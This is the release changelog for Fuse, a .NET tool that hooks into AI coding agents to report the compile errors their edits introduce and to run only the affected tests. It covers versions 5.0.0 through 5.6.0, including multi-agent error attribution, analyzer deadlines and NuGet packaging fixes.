# Changelog

The list of changes in each release, which the release workflow publishes as the release notes. The [changelog page](https://fuse.codes/docs/changelog) explains each release with its upgrade steps and says which versions are supported. Each release groups its changes as Added, Changed, Removed, Fixed, Security and Documentation, listing only the groups it has. Versions before 5.0.0 are deprecated.

## 5.6.0

Compared with 5.5.0. Fuse narrows more test runs to the tests a change can affect. Microsoft.Testing.Platform projects use their framework's filters, and `fuse test` commands that only name projects or build switches plan within that scope. Repeated checks of an unchanged tree can reuse a previous answer, and capped check and test output points to a file that holds the full result.

Update with `dotnet tool update -g Fuse`. If you use Cursor or Copilot CLI, run `fuse init` again so their pre-shell hooks rewrite `dotnet build` and `dotnet test`. The other harnesses need nothing.

### Added

- For a test project on Microsoft.Testing.Platform, `fuse test` runs only the affected tests. Fuse identifies the framework from the project's packages and passes the filter in that framework's form. xUnit v3 and TUnit receive their own filter arguments. MSTest and NUnit receive the VSTest filter in a runsettings file. If Fuse does not know the framework, the project runs whole and the summary gives that reason. [Commands](https://fuse.codes/docs/commands#fuse-test) describes the runs, and [Limits](https://fuse.codes/docs/limits) covers the projects that stay whole ([#57](https://github.com/Litenova-Solutions/Fuse/issues/57)).
- `fuse test tests/Foo.Tests` runs the affected tests in Foo.Tests instead of every test. The same applies to project and solution paths and to commands whose other arguments only control the build, such as `--no-build`. The summary names the projects included. A path that names no test project is refused rather than treated as an empty run. [Commands](https://fuse.codes/docs/commands#fuse-test) lists the arguments that count as scope only ([#69](https://github.com/Litenova-Solutions/Fuse/issues/69)).
- When a check or test answer leaves out errors or failures to stay short, its summary ends with `; all N in <path>`. `last-check-results.txt` in the state directory holds every error the engine returned. `last-test-results.txt` holds every failure, grouped by project. Fuse replaces both files on every check and test run, including clean ones, so the path in the latest answer does not lead to an older result. [Commands](https://fuse.codes/docs/commands#fuse-check) shows the check form and the [test form](https://fuse.codes/docs/commands#fuse-test) ([#123](https://github.com/Litenova-Solutions/Fuse/issues/123)).
- `fuse init` registers the pre-shell hook in Cursor and Copilot CLI. The hook rewrites `dotnet build` to `fuse build` and `dotnet test` to `fuse test`, as it already did in Claude Code. Run `fuse init` again in either harness to get the entry. [Connect your agent](https://fuse.codes/docs/harnesses) shows each harness's settings ([#71](https://github.com/Litenova-Solutions/Fuse/issues/71), [#142](https://github.com/Litenova-Solutions/Fuse/issues/142)).
- The latency suite's multi-agent results include `stopsUnchangedRepeat`: three checks of the same tree with no edit in between. The field records how long those repeats take now that an unchanged check can reuse a previous answer. [Evals](https://fuse.codes/docs/evals#multi-agent-scenario) describes the field ([#66](https://github.com/Litenova-Solutions/Fuse/issues/66)).

### Changed

- A repeated check can reuse an earlier answer when its scope, session and analyzer run are the same and nothing that answer depends on has changed. Fuse then returns that answer without binding the files again. It keeps the last eight answers in memory and forgets them when the engine exits. It never reuses an answer whose analyzers did not finish. [How it works](https://fuse.codes/docs/how-it-works#check) explains what the answer depends on ([#97](https://github.com/Litenova-Solutions/Fuse/issues/97)).
- A passing `fuse build` summary includes the build's warning count. You can see warnings creeping up without running another build. [Commands](https://fuse.codes/docs/commands#fuse-build) shows the line ([#121](https://github.com/Litenova-Solutions/Fuse/issues/121)).
- The engine log's phase line breaks binding into `bindUpdate`, `bindCompiler`, `bindAnalyzers` and `bindFrameworks`, alongside the `bindTargets` total. `bindFrameworks` is a count of the documents bound, one per target framework. Scripts or notes that read the phase line can see which part of binding took the time. [Troubleshooting](https://fuse.codes/docs/troubleshooting#reading-a-phase-line) says how to read it ([#66](https://github.com/Litenova-Solutions/Fuse/issues/66)).

### Fixed

- For a Microsoft.Testing.Platform project in a repository without the `global.json` opt-in, Fuse builds the project and runs its test application directly, with the same framework filter. In 5.5.0 it treated the project as a VSTest project. MSTest, NUnit and TUnit runs reported problems, and an xUnit v3 run could read as a pass after running no tests. A filtered run that matches no test is reported as having run no test. [Commands](https://fuse.codes/docs/commands#fuse-test) and [Limits](https://fuse.codes/docs/limits) describe both forms ([#57](https://github.com/Litenova-Solutions/Fuse/issues/57)).
- When other arguments make `fuse test` pass the command through to `dotnet test`, a first argument that names a directory, project file or solution file is passed as `--project` or `--solution`, as Microsoft.Testing.Platform requires. In 5.5.0 `dotnet test` rejected the directory form and Fuse could report only that the run exited with code 1 and produced no results. [Commands](https://fuse.codes/docs/commands#fuse-test) describes when arguments pass through ([#122](https://github.com/Litenova-Solutions/Fuse/issues/122)).
- A `--results-directory` value is passed to `dotnet test` as a full path. On Windows, a Git Bash spelling such as `/c/...` is read as the equivalent Windows path. If a run then produces no results, the answer names the directory Fuse read. In 5.5.0 the POSIX form could produce no TRX file and no explanation ([#124](https://github.com/Litenova-Solutions/Fuse/issues/124)).
- When a test runner colors its output, as the platform runners do on Linux and macOS, Fuse reads the run's counts and failures from it and answers in its own form. In 5.5.0 it could not read colored output: a passing run said only that the tests passed, and a failing run printed the runner's own output ([#57](https://github.com/Litenova-Solutions/Fuse/issues/57)).

### Documentation

- [Commands](https://fuse.codes/docs/commands#fuse-test) and [Limits](https://fuse.codes/docs/limits) explain framework-specific platform filters, direct test application runs without the `global.json` opt-in, and which `fuse test` arguments only set the scope. [How it works](https://fuse.codes/docs/how-it-works#check) explains when a check answer can be reused. [Messages](https://fuse.codes/docs/messages#invalidpath) covers a path that names no test project, [Connect your agent](https://fuse.codes/docs/harnesses) adds the Cursor and Copilot CLI setup, and [Evals](https://fuse.codes/docs/evals#multi-agent-scenario) documents the unchanged-repeat measurement.

## 5.5.0

Compared with 5.4.0. Slow analyzers can no longer make a hook run out of time without answering. Fuse keeps the hook wait inside the harness limit, gives the HEAD side of a check the same analyzer deadline as the working tree, and keeps unfinished whole-project analyzer work for the next check. This release also adds `fuse uninit` for removing Fuse from a repository.

Update with `dotnet tool update -g Fuse`. If you ran `fuse init --instructions`, run it again to replace the Fuse section in `AGENTS.md`, `CLAUDE.md` or `GEMINI.md`. Until you do, the old section tells agents to run `fuse check` before finishing, which repeats the stop hook's check.

### Added

- `fuse uninit` removes the entries that `fuse init` and `fuse init --instructions` wrote for every harness. It keeps entries that are not Fuse's. It then stops the repository's engine and deletes its state. [Commands](https://fuse.codes/docs/commands#fuse-uninit) lists what it removes ([#94](https://github.com/Litenova-Solutions/Fuse/issues/94)).

### Changed

- The stop hook and Claude Code post-edit hook wait 280 seconds for an answer. That leaves 20 seconds of the harness's 300-second limit to deliver it. In 5.4.0 the hook could use all 300 seconds, so the harness might end it before the answer arrived. [How it works](https://fuse.codes/docs/how-it-works#check) describes the waits ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).
- A check gives the analyzers at HEAD the same deadline as the analyzers in the working tree. If HEAD's analyzers do not finish in a file, Fuse leaves the working tree's analyzer errors in that file out of the answer. It counts the file among those whose analyzers did not finish. In 5.4.0 HEAD's analyzers always ran to the end, even after the client had stopped waiting and the check could answer nothing. [How it works](https://fuse.codes/docs/how-it-works#check) describes the deadline ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).
- An analyzer that reads the whole project keeps running after a check stops waiting for it. The next check of the same code can use its finished errors instead of running it again. [How it works](https://fuse.codes/docs/how-it-works#check) describes which errors are kept between checks ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).
- The engine exits after 30 minutes without a request instead of 10 minutes. A command after the longer idle period can still use the loaded projects and HEAD analyzer work. The engine also holds its memory for longer while it stays running. [Limits](https://fuse.codes/docs/limits#the-engine) describes that trade-off ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).
- The section that `fuse init --instructions` writes says the stop hook checks every change when the agent finishes. It presents `fuse check` as the same check run sooner. The old section told every agent to run `fuse check` before finishing and every subagent to run `fuse test` before handing back work. [Subagents and parallel agents](https://fuse.codes/docs/parallel-agents#telling-agents-about-fuse) shows the current section ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).
- When more than 40 files with errors would need a decision about which session caused them, the check summary counts the files reported without that decision. In 5.4.0 it said nothing about those files, so the reader could not tell that attribution had stopped there. [How it works](https://fuse.codes/docs/how-it-works#check) describes the limit ([#93](https://github.com/Litenova-Solutions/Fuse/issues/93)).

### Documentation

- [How it works](https://fuse.codes/docs/how-it-works#check) and [Limits](https://fuse.codes/docs/limits#the-engine) explain the analyzer deadline at HEAD, the hook waits and the engine's idle time. [Commands](https://fuse.codes/docs/commands#fuse-uninit) documents removing Fuse from a repository.

## 5.4.0

Compared with 5.3.0. Several agents can share one working tree with less interference. The stop hook holds a session to the errors its own edits caused, test runs without MSBuild from different agents can run at the same time, and slow or failed builds show more of what happened.

Update with `dotnet tool update -g Fuse`. If you use Claude Code, run `fuse init` again so a subagent's stop runs Fuse's stop hook too. To use Muse Code, run `fuse init`, then `muse plugins install .muse/plugins/fuse --scope project` and `muse plugins approve fuse` once.

### Added

- Muse Code is a supported harness. `fuse init` writes a plugin bundle with the post-edit, pre-shell and stop hooks. You install and approve that bundle once in Muse. [Connect your agent](https://fuse.codes/docs/harnesses#muse-code) shows the bundle and the commands.
- In Claude Code, `fuse init` registers Fuse's stop hook for `SubagentStop` as well as the main stop. A subagent is sent back for errors its own edits caused before it hands work back. [Connect your agent](https://fuse.codes/docs/harnesses#claude-code) shows the settings.
- When the pre-shell hook turns an agent's `dotnet test` into `fuse test`, the run covers the tests that session's edits affect. The summary says how many changed files only other sessions wrote and were left out. [How it works](https://fuse.codes/docs/how-it-works#test-selection) describes session-scoped selection.
- When a build target's command fails with `error MSB3073`, `fuse build` and a failed test build print the last lines that command printed. That can show a code generator's exception instead of only the command's exit code. [Commands](https://fuse.codes/docs/commands#fuse-build) shows the output.
- A build that takes 10 seconds or more ends its summary with its slowest tasks and projects. [Troubleshooting](https://fuse.codes/docs/troubleshooting#a-slow-build) explains how to read that line.
- When the type or member behind an error is declared in a file generated during the build, the error names that generated file. If the file is generated from changed code, the message tells you to run `fuse build`. A generated API client is one example. [How it works](https://fuse.codes/docs/how-it-works#check) describes when Fuse adds that note.
- `fuse stop` stops the current repository's engine. If the engine has not exited within 10 seconds of being asked, Fuse kills it. `fuse stop --all` stops every engine. The next command starts a new engine. [Commands](https://fuse.codes/docs/commands#fuse-stop) describes both forms.
- `fuse init --instructions` also writes a marked Fuse section into `AGENTS.md`. It writes the same section into `CLAUDE.md` and `GEMINI.md` when those files exist. A later run replaces the section between the markers. [Commands](https://fuse.codes/docs/commands#fuse-init-instructions) shows the section.
- The latency suite's multi-agent scenario records `stops`, for repeated checks of every change, and `tests`, for two `fuse test` clients running at once. [Evals](https://fuse.codes/docs/evals#multi-agent-scenario) describes both fields.

### Changed

- The stop hook blocks only on errors caused by the stopping session's edits, whether those edits caused them alone or together with another session's edits. It also blocks on errors in changes no session is credited with. It counts the errors it leaves to other sessions. Once a subagent stops, its edits count as its parent's. In 5.3.0 the stop hook blocked on every error in the working tree. [How it works](https://fuse.codes/docs/how-it-works#check) describes how a session's errors are decided.
- Test runs without MSBuild from several agents run at the same time. Each run uses its own copy, and `fuse test` releases the build lock while those runs execute. In 5.3.0 every `fuse test` waited for the run before it. [How it works](https://fuse.codes/docs/how-it-works#without-msbuild) describes the copies, and [Limits](https://fuse.codes/docs/limits#test-runs-without-msbuild) lists integration tests that can still collide.
- When a check covers every change, it can keep a file's errors from an earlier check if nothing that file depends on has changed. A stop hook that checks many files again after a small fix therefore repeats only the work affected by that fix and its dependents. [How it works](https://fuse.codes/docs/how-it-works#check) describes when errors are kept.

### Fixed

- After a build writes a generated file again, the next check reads the new contents. In 5.3.0 the engine kept the version from when the project loaded and could report errors the build had already fixed. [How it works](https://fuse.codes/docs/how-it-works#projects-and-compilations) describes how generated files are refreshed.
- If another agent moves a source file while `fuse build` is running and the build fails because that file is gone, Fuse runs the build once more and says that it did. The second run uses the file list as it stands then. [Commands](https://fuse.codes/docs/commands#fuse-build) describes the retry.
- A test run without MSBuild no longer keeps files in the repository's `bin` folder open. A build running at the same time no longer fails because Fuse holds one of its outputs. [How it works](https://fuse.codes/docs/how-it-works#without-msbuild) describes the copy it runs from.

### Documentation

- [Subagents and parallel agents](https://fuse.codes/docs/parallel-agents) is a new page about several agents in one repository. The documentation explains session attribution at the stop hook, concurrent test runs, generated files that change during a build, and the build's slowest tasks and file log. [Benchmarks](https://fuse.codes/docs/benchmarks) quotes the 5.4.0 eval runs and adds [repeated checks and tests at once](https://fuse.codes/docs/benchmarks#repeated-checks-and-tests-at-once).

## 5.3.0

Compared with 5.2.4. Analyzers that read the whole compilation no longer make every check pay their cost for every file. The post-edit hook leaves them out and names them, other checks run them once per compilation, and a slow analyzer run can no longer consume the client's whole wait without an answer.

Update with `dotnet tool update -g Fuse`; nothing else needs to change.

### Added

- An analyzer that reads the whole project from a compilation-start or compilation action runs once per compilation rather than once per checked file. A check covering many files therefore does not repeat that work for each file, and it holds far less memory. The engine log names each analyzer run this way. [How it works](https://fuse.codes/docs/how-it-works#check) explains which analyzers count as reading the whole project ([#88](https://github.com/Litenova-Solutions/Fuse/issues/88)).
- A check stops its analyzers when 80% of the client's wait has passed. It answers with every compiler error and the analyzer errors found by then. The summary says where analyzers did not finish. In 5.2.4 the client could give up first and the check answered nothing. [Limits](https://fuse.codes/docs/limits) describes what a partial analyzer answer means ([#88](https://github.com/Litenova-Solutions/Fuse/issues/88)).
- The latency suite records the engine's peak working set and its working set after it becomes idle. A new analyzers suite measures a generated repository whose analyzer reads the whole project. [Evals](https://fuse.codes/docs/evals) describes the new fields and suite.

### Changed

- The post-edit hook leaves out analyzers that read the whole project and names them in its summary. The stop hook, `fuse check` and the MCP check tool still run them. An edit can therefore be answered without waiting for those analyzers, while their errors still arrive at the later checks. [Limits](https://fuse.codes/docs/limits) describes the split ([#88](https://github.com/Litenova-Solutions/Fuse/issues/88)).
- Thirty seconds after its last request, the engine returns memory freed by its checks to the operating system. It exits after 10 idle minutes instead of 30. The next command after it exits loads the projects again. [How it works](https://fuse.codes/docs/how-it-works#process-model) describes the idle behavior ([#88](https://github.com/Litenova-Solutions/Fuse/issues/88)).

### Fixed

- The engine log's `check:` line counts only that check's binding and analyzer time. In 5.2.4 a check after a cancelled check could also count the cancelled check's time, which made the logged cost too high.

### Documentation

- The documentation explains compilation-wide analyzers, the analyzer deadline, and what the post-edit hook leaves for later checks. [Troubleshooting](https://fuse.codes/docs/troubleshooting#a-slow-analyzer) adds guidance for a slow analyzer, and [How it works](https://fuse.codes/docs/how-it-works#process-model) covers the engine's idle memory and exit.

## 5.2.4

Compared with 5.2.3. When several agents share a working tree, each post-edit hook reports only the errors that session's edits caused. The stop hook no longer tells the stopping agent that its changes introduced every error it lists.

Update with `dotnet tool update -g Fuse`. If you use OpenCode, run `fuse init` again so its plugin sends the session id. Until you do, OpenCode's post-edit hook reports every error, as it did in 5.2.3.

### Added

- When several agents share a working tree, the post-edit hook reports only errors caused by your session's edits. It says how many errors it left out for other sessions. [How it works](https://fuse.codes/docs/how-it-works) explains how Fuse decides whose an error is, and [Limits](https://fuse.codes/docs/limits) lists the cases it cannot separate ([#47](https://github.com/Litenova-Solutions/Fuse/issues/47)).
- The evals include an attribution suite for two agents whose changes break each other's code. It is light enough to run on one or two repositories. The latency suite records one such pair as well. [Evals](https://fuse.codes/docs/evals) describes what the suite measures.

### Changed

- The stop hook's message says another agent may have caused some of the errors. In 5.2.3 it said `your changes introduced them`, even when another session had made the edit behind an error.
- For OpenCode, the plugin that `fuse init` writes sends the session id to the post-edit hook. That is what lets the hook separate one session's errors from another's in OpenCode.

### Fixed

- When several changes reach one file, each error's cause line names the change that error is about. In 5.2.3 every error in the file showed the same change, even when a different change had put that error in reach.

### Documentation

- The documentation explains sessions and error attribution: how Fuse decides whose an error is, what each harness sends, and the cases it cannot separate. Start with [How it works](https://fuse.codes/docs/how-it-works#check), [Connect your agent](https://fuse.codes/docs/harnesses#sessions) and [Limits](https://fuse.codes/docs/limits#what-a-check-does-not-see).

## 5.2.3

Compared with 5.2.2. Update with `dotnet tool update -g Fuse`; nothing else needs to change.

### Fixed

- `fuse test` selects tests that reach a change only through a helper class in a test project, such as a shared builder that holds no tests itself. This applies when the helper changes and when production code that tests reach through the helper changes. In 5.2.2 selection named the helper class itself, which matched no test, so those tests did not run ([#83](https://github.com/Litenova-Solutions/Fuse/issues/83)). The filter still leaves out a test name already selected by its class, so a change to a private helper inside a test class passes one pattern for that class.

### Documentation

- The limits page warns that, when several agents edit one working tree, a check does not know which agent made an edit. An agent can therefore be told about another agent's error, and the stop hook checks every change in the tree. The page links to the work on telling each agent only about its own errors ([#47](https://github.com/Litenova-Solutions/Fuse/issues/47)).
- The home page shows the same edit through `dotnet build` and `fuse check`, played at the median times measured on Jellyfin. Its features lead with parallel agents in one working tree, and each feature links to the page that explains it.
- Every page's header links to GitHub, and every footer links to the changelog and Litenova Solutions. The FAQ says the benchmarks come from GitHub Actions windows-latest runners, matching the benchmarks page; it previously said one Windows machine.
- This changelog groups each release's changes as Added, Changed, Removed, Fixed, Security and Documentation.

## 5.2.2

Compared with 5.2.1. Update with `dotnet tool update -g Fuse`; nothing else needs to change.

### Changed

- A test plan holds the engine's request lock only while it syncs the tree and selects tests. It prepares copies for runs without MSBuild after releasing the lock. A check from another agent therefore no longer waits while a plan emits assemblies, although it still waits for that plan's sync and selection. An assembly unchanged since the previous plan is not emitted again.
- The engine log's phase line splits test-plan preparation into `mirror` and `emit`. It also records `gateHolder`, which names what a request waited behind for the request lock. A script that read the old single preparation phase needs the new names.

### Fixed

- For a large selection, `fuse test` passes the filter to `dotnet test` in a runsettings file, as `RunConfiguration/TestCaseFilter` with `--settings`, instead of on the command line. A selection of up to 2,000 test names runs only those tests. In 5.2.1 a filter longer than 8,000 characters was silently cut back to whole test classes, and a longer one to the whole project. Past 2,000 names the filter still collapses, but the summary says so and the engine log names the project.
- A run without MSBuild uses the test project's own runsettings file, named by `RunSettingsFilePath`, with Fuse's filter added. That matches `dotnet test` on the project. In 5.2.1 a run without MSBuild ignored the project's file.
- When reference search reaches a project that uses an analyzer the repository has not built yet, such as Jellyfin's own analyzer before its first build, a check leaves that analyzer out and answers. In 5.2.1 it answered `internal error: Unexpected value 'Microsoft.CodeAnalysis.Diagnostics.UnresolvedAnalyzerReference'`.
- The pre-shell hook rewrites `dotnet build` and `dotnet test` after leading variable assignments. For example, `DOTNET_CLI_UI_LANGUAGE=en dotnet test` becomes `DOTNET_CLI_UI_LANGUAGE=en fuse test`. An assignment counts only when its value has no whitespace, quote, backtick, separator, redirection or parenthesis. For Codex, only plain values count. In 5.2.1 such a command was left unchanged.
- A Microsoft.Testing.Platform run that exits with 8, its code for a run in which no test ran, prints `fuse: no test matched the dotnet test arguments (exit code 8)` for `fuse test` with arguments. A planned run prints `fuse: the test run of <project> ran no test (exit code 8)`. In 5.2.1 both said the run had exited with code 8 and produced no results.
- A second `fuse init` prints `unchanged <file>` when a settings file already holds what it would write, and it leaves the file untouched. In 5.2.1 it printed `wrote <file>` and wrote the file again.
- `fuse check` no longer reports CS8795 for a `[GeneratedRegex]` method that names a culture, such as `"en-US"`. The engine runs with invariant globalization, where the Regex source generator could not look the culture up and wrote no implementation. The same failure had sent test projects depending on such a project through MSBuild instead of running them without it.
- The check summary counts every error the check found and every file it found them in. In 5.2.1 it counted only the first 200 errors the engine sends. A change that broke 602 call sites in 3 files could therefore print `200 error(s) introduced in 2 file(s)`.
- A file that differs from HEAD only by CRLF line endings inside a multi-line string constant, as a checkout with `core.autocrlf` writes it, is no longer treated as a declaration change. The check stays within that file instead of checking the files that use its declarations.
- For a test project on Microsoft.Testing.Platform, which ran whole in this release, the `fuse test` summary counts every test in the project. It no longer counts only the tests selection had named before the project ran whole.
- When the stop hook sends an agent back for a missing restore, it sends the restore message alone. It no longer adds the line saying the changes introduced errors.
- A stop payload whose `loop_count` is not a whole number that fits in 32 bits no longer makes the stop hook fail. In 5.2.1 the hook could fail on that value and let the agent finish unchecked.
- A state directory created by `fuse build` or `fuse test` records its repository in its `root` file. The daily cleanup can therefore remove it after the repository is gone, as it already did for a state directory created by an engine.
- When a client finds an engine copy without its completion marker, such as a copy a cleanup deleted part of, it makes the copy again. If the old copy cannot be replaced, it runs the engine from a fresh copy beside it. In 5.2.1 it ran the engine from the incomplete copy, so the engine could not start until someone deleted that copy by hand.

### Documentation

- The benchmarks measure four open-source repositories. FluentValidation, a small library, replaces the generated fixture beside NodaTime, Jellyfin and the Community Toolkit. In those results a check is 7.0x to 31.0x faster than `dotnet build` at the median and 2.5x to 5.3x faster over all 30 edits in each repository. `fuse test` is 1.3x to 3.7x faster than `dotnet test`. The `dotnet test` baseline is one run of the whole solution, as a user runs it, rather than one test project after another; that change lowered the test speedups.
- The benchmarks page and chart give each command's fastest and slowest case, mean, standard deviation and P95 beside its median. The README, home page and sharing image quote the new ranges. They replace the fixture's 24.6x check figure and a 5.7x test figure in the README, which had been a time in seconds.

## 5.2.1

Compared with 5.2.0. 5.2.0 could not be installed from NuGet. nuget.org refused its per-platform packages, so `dotnet tool install` and `dotnet tool update` found the `Fuse` package but not the package for the platform. Update with `dotnet tool update -g Fuse`, from 5.1.0 or from a 5.2.0 installed another way; nothing else needs to change.

### Added

- The `Fuse` package on nuget.org shows the Fuse icon.

### Fixed

- Fuse can be installed from NuGet again. The per-platform packages are named `Litenova.Fuse.win-x64`, `Litenova.Fuse.linux-x64`, `Litenova.Fuse.linux-arm64`, `Litenova.Fuse.osx-arm64`, `Litenova.Fuse.linux-musl-x64`, `Litenova.Fuse.linux-musl-arm64` and `Litenova.Fuse.any`. The SDK had named them after the tool, `Fuse.win-x64` and so on, but nuget.org reserves the `Fuse.` prefix without an owner and refused each one as "The package ID is reserved". The `Fuse` package points to the new names. `dotnet tool install -g Fuse` remains the only command you run.
- The publish workflow fails when nuget.org refuses a package, and it shows nuget.org's reason. For 5.2.0 it passed although only the `Fuse` package was pushed, because `--skip-duplicate` reported each refusal with status 409 as a package that already existed.

## 5.2.0

Compared with 5.1.0. Update with `dotnet tool update -g Fuse`; nothing else needs to change, and `fuse init` does not need to run again.

### Added

- On Windows x64, Linux x64, Linux Arm64 and macOS Arm64, the `fuse` command is the native client. It is compiled ahead of time to native code, so a hook or command starts no .NET runtime and compiles no code before it sends a request to the engine. The engine still runs on the .NET runtime from the `fuse.dll` installed with the client. On other platforms, including Windows Arm64, macOS x64 and Alpine, `fuse` runs `fuse.dll` as it did in 5.1.0. So do `dotnet tool run fuse` and tool manifests everywhere.
- Each state directory holds a `root` file containing its repository's path. Once a day, a starting engine deletes state directories whose repository no longer exists and that nothing wrote to for a day. That removes state left by deleted temporary repositories, which 5.1.0 kept indefinitely.

### Changed

- The `Fuse` package points to one package per platform, and `dotnet tool install` and `dotnet tool update` choose the package for your platform: `Fuse.win-x64`, `Fuse.linux-x64`, `Fuse.linux-arm64`, `Fuse.osx-arm64`, `Fuse.linux-musl-x64`, `Fuse.linux-musl-arm64` and `Fuse.any`. The Linux native clients run on glibc 2.27 and later. On Windows, the native client is the `fuse.exe` in the tools directory, so Git Bash, PowerShell and cmd all run it.
- The build id in each request is the product version plus the module id of `fuse.dll`. The native client reads that module id from the `fuse.dll` installed with it. A running 5.1.0 engine answers the first 5.2.0 request by restarting, and the client starts a 5.2.0 engine, so the request does not fail.
- In the native client, `fuse engine <root>` prints that the engine runs from `fuse.dll` on the .NET runtime and exits with 2. Clients start the engine; there is no supported reason to run that command by hand.
- When a client starts the engine and has no runtime directory of its own, as the native client does not, it looks for the `dotnet` host on `PATH` if neither `DOTNET_HOST_PATH` nor `DOTNET_ROOT` names one.
- For a test project on Microsoft.Testing.Platform, `fuse test` reads counts from the run summary and each failed test's message and stack frames from the run output. It answers in the VSTest form: a `FAILED` entry for each failure, then `fuse: F failed, P passed in T s`. In 5.1.0 a passing run printed `fuse: tests passed in T s`. A failing run printed the last 30 lines of output and `exited with code E and produced no results`.
- A starting engine deletes copies of other builds when no running engine holds them and they are more than ten minutes old. Each running engine marks its copy with a lock file. In 5.1.0 Fuse deleted only copies last written more than seven days earlier, so each build could leave a copy for a week.

### Fixed

- In a repository whose `global.json` selects Microsoft.Testing.Platform, `fuse test` with arguments passes those arguments without adding VSTest's `--logger`, `--results-directory`, `-nologo` and `-tl:off`. This includes the `fuse test --filter-class Name` form the pre-shell hook writes for `dotnet test --filter-class Name`. In 5.1.0 Fuse added the VSTest switches, so each such run failed with exit code 5 and ran no test.
- Fuse decides whether `dotnet test` uses Microsoft.Testing.Platform from the `test.runner` value in the `global.json` nearest the working directory, searching up to the repository root. That is how the dotnet CLI reads it. In 5.1.0 Fuse read only the root `global.json` and treated any mention of the platform name as selecting it.
- When every file named to `fuse check` or the `fuse_check` tool is one Fuse cannot check, such as a mistyped path or a file in another language, Fuse answers `fuse: none of the files named in the check is a C# source file of a project in this repository: <files>` and exits with 2. In 5.1.0 it answered `fuse: no errors introduced (0 file(s) checked)` and exited with 0, which read as a pass.
- A file renamed since HEAD is compared with the errors HEAD had under its old name. An error that existed before the rename is therefore not reported as introduced. Git status reports a rename as a deleted file and a new file; Fuse treats the new file as a rename of a deleted file when they share at least half their lines. In 5.1.0 it reported every error HEAD had in a renamed file as introduced.

## 5.1.0

Compared with 5.0.0. After updating, run `fuse init` again in each repository. The shell hook event is `pre-shell`, and 5.1.0 does not accept the `pre-bash` event that 5.0.0 settings call. Until a repository is updated, its `dotnet build` and `dotnet test` commands are not rewritten.

### Added

- An error in a file the agent did not edit is followed by a cause line. The line starts with `changed:` or `removed:` and gives the one-line header of the declaration change that put the file in the check. It shows the declaration as the working tree has it, or as HEAD had it when it was removed. An answer holds at most ten cause lines. If the cap leaves a printed error without its cause, the summary ends with `N cause(s) left out`.
- `fuse build` and `fuse test` take a per-repository lock while they write build output. Two agents building or testing through Fuse therefore run one after the other instead of making MSBuild fail with MSB3021, MSB3027 or CS2012 on a file the other holds. A client that has to wait says so once on standard error. A client that cannot take the lock says why and runs anyway. The arguments `fuse build` passes to `dotnet build`, including its implicit restore, are unchanged.
- `engine.log` names every request by kind, in the form `CheckFiles Calc.cs took 15 ms`, and writes one line of times by phase. A slow check or test plan can therefore be traced to the phases that took the time.
- `fuse init` adds `.fuse/` to the root `.gitignore`, creating that file when the repository has none, unless a line already names the folder. The `.fuse` folder is reserved for files Fuse may later keep in a repository, such as an index. This release writes nothing there.

### Changed

- The hook event that rewrites `dotnet build` and `dotnet test` is `pre-shell`. `fuse init` writes it for Claude Code, Gemini CLI, Codex and the OpenCode plugin. If an older settings file still calls `fuse hook` with `pre-bash`, Fuse prints a usage line on standard error and exits with 0. Run `fuse init` again to update the entry.
- `fuse check` says "introduced". A failing answer starts `fuse: N error(s) introduced in M file(s)`, and a clean one says `fuse: no errors introduced`. In 5.0.0 those lines said `new error(s)` and `no new errors`. The summary also says `checked whole projects` instead of `whole projects bound`.
- `fuse test` output uses the new terms throughout. It says `without MSBuild` and `without MSBuild for N of M project(s)` where 5.0.0 said `fast path`. It says `no test is affected by the changes` instead of `no test reaches the changed code`, and `ran the tests your dotnet test arguments name` instead of `ran the tests you selected`.
- Test selection includes fewer tests that do not reach the change. Splitting a field declaration into two, or adding a variable to one, selects the tests that reach those fields rather than every test that reaches the type.
- A formatting-only or comment-only edit inside a type header, parameter type or conversion no longer counts as a declaration change for test selection. An edit above a nested delegate does not count as a change to that delegate either.
- When a test run exits with a code other than 0 and writes no results, as a failing Microsoft.Testing.Platform run did in this release, the last line is `fuse: the test run of <project> exited with code E and produced no results`. In 5.0.0 it said `test build failed (exit code E)`.
- The engine's pipe requests and responses changed shape. An engine from another build, including a running 5.0.0 engine, answers the first new request by restarting and exits. The client then starts an engine from its own build and sends the request again. The first command after updating therefore starts a fresh engine, but no request fails.
- The stop hook tells the agent `HEAD does not have them, so your changes introduced them`. In 5.0.0 it said `they are not in the last commit`. The MCP check tool's description also says HEAD.
- `fuse init` prints `hooks registered` when it registers hooks. When it registers only the MCP server, it prints `MCP server registered in .vscode/mcp.json`. Messages that referred to the product in other words name it as Fuse.
- Outside a git repository, `fuse init` and `fuse mcp` print the same message as `fuse check`: `fuse: not inside a git repository; Fuse compares your changes with HEAD, so it needs one`.

### Fixed

- When a repository builds its own analyzer or source generator, the engine loads it from a copy in the state directory. A running engine no longer holds the built file open, so a real build that rebuilds that analyzer or generator no longer fails with MSB3021 or MSB3027.
- Removing a `using` directive checks files that use the edited file's types. The declarations' text has not changed, but the type names in them may resolve differently without the directive. Adding a `using` still checks only the edited file.
- A check finds a change to a type's parameterless constructor, such as making `public C()` internal, even when a static constructor follows it in the file. 5.0.0 missed that change. A formatting-only edit inside an explicit interface name also no longer counts as a declaration change.
- Test selection selects tests reached by several edits it missed in 5.0.0. They are a body edit to an explicit interface implementation that shares its name and parameter types with another member, and an edit to a delegate declared at namespace level.
- Changing a parameter modifier (`ref`, `out`, `in`, `params` or `this`) selects tests that reach the member. It also selects tests that reach the member's type, because callers may need the new modifier at the call site.
- Changing `class` to `struct`, or `record` to `record struct`, selects the tests that reach that type. Test selection missed both forms in 5.0.0.
- `fuse test --all` with any other argument prints `fuse: --all runs every test and cannot be combined with other arguments; pass the arguments without --all to choose the scope` on standard error. It runs nothing and exits with 2. In 5.0.0 Fuse dropped `--all` and ran what the other arguments named.
- When the test project's build output holds an older build of a project its tests load, a run without MSBuild emits the current project instead of running the older copy. This can happen after `dotnet build Lib` when `Lib.Tests` references `Lib`. In 5.0.0 a test that the working tree should fail could pass against the old copy.
- When one test project does not build and others do run, `fuse test` prints the other projects' results first, then the failed project's build errors, and exits with 1. In 5.0.0 it printed only the projects that ran, so a passing project could hide the failed build.
- If a check arrives just as the engine finishes loading a dependent project in the background, the check includes that project. In 5.0.0 it could see the project as loaded but leave it out of the check, missing errors there.
- A project whose NuGet restore logs a warning, such as a package advisory, is no longer reported as a project Fuse could not load. Fuse can answer in a repository whose restore completes with warnings.
